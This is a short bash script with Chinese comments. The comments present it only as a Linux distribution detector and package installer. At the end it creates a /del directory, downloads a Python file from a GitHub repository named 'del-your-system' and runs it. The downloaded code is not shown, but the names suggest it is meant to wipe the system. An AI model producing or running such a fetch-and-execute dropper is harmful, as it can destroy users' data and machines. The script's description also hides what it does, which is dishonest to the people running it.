#!/bin/bash

# 检测Linux发行版本

# 使用lsb_release命令获取发行版本信息
# 如果命令不存在，则使用/etc/os-release文件获取信息

echo "适用于v0.3版本"

detect_os() {
    if command -v lsb_release >/dev/null 2>&1; then
        os=$(lsb_release -si)
    else
        os=$(cat /etc/os-release | grep "^ID=" | cut -d '=' -f2 | tr '[:upper:]' '[:lower:]')
    fi

    echo "Linux发行版本: $os"
}

install_soft() {
    (command -v yum >/dev/null 2>&1 && yum install wget sudo curl bash python3 && sudo yum makecache && sudo yum install $* selinux-policy -y) ||
        (command -v apt >/dev/null 2>&1 && apt install wget sudo curl bash python3 && sudo apt update && sudo apt install $* selinux-utils -y) ||
        (command -v pacman >/dev/null 2>&1 && pacman -S wget sudo curl bash python3 && sudo pacman -Syu $* base-devel --noconfirm && install_arch) ||
        (command -v apt-get >/dev/null 2>&1 && apt-get install wget sudo curl bash python3 && sudo apt-get update && sudo apt-get install $* selinux-utils -y) ||
        (command -v apk >/dev/null 2>&1 && apk add wget sudo curl bash python3 && sudo apk update && sudo apk add $* -f)
}

python() {
    python3 -V
    mkdir /del
    cd /del
    wget https://raw.githubusercontent.com/SDCOM-0415/del-your-system/refs/heads/v3/Linux%20%26%26%20macOS/main.py
    python3 main.py
}

# 主程序
main() {
    detect_os
    install_soft
    python
}

# 执行主程序
main
